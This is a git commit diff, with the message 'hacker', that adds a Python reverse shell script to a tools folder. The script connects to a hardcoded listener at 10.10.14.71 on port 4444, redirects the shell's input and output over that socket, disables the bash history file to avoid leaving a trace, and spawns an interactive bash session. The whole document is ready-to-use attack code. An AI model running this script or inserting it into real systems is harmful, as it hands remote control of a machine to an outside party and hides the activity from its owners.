2db4600691e2df04d293284e882eb7c95fa235fc
root <root@localhost.localdomain>
2019-03-19 15:24:59 -0400

    hacker

---
+++ Tools/py_shell.py
@@ -0,0 +1,19 @@
+import os
+import pty
+import socket
+
+lhost = "10.10.14.71" # XXX: CHANGEME
+lport = 4444 # XXX: CHANGEME
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((lhost, lport))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    os.putenv("HISTFILE",'/dev/null')
+    pty.spawn("/bin/bash")
+    s.close()
+	
+if __name__ == "__main__":
+    main()
